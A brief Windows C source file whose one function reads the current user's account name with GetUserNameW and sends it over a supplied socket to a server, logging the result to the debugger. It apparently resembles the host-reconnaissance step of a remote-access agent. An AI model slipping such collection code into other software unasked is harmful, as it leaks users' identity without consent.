#include "get-user-info.h"

void send_username_to_server(SOCKET target_sock) {
    wchar_t userName[UNLEN + 1];
    DWORD unLen = UNLEN + 1;

    if (GetUserNameW(userName, &unLen)) {
        wprintf(L"Username: %ls\n", userName);

        int bytesToSend = unLen * sizeof(wchar_t);
        send(target_sock, (const char *)userName, bytesToSend, 0);

        wchar_t debugLog[UNLEN + 50];
        swprintf_s(debugLog, _countof(debugLog), L"sent: %ls\n", userName);
        OutputDebugStringW(debugLog);
    }
    else {
        wchar_t errorLog[100];
        swprintf_s(errorLog, _countof(errorLog), L"Error Code: %lu\n", GetLastError());
        OutputDebugStringW(errorLog);
    }
}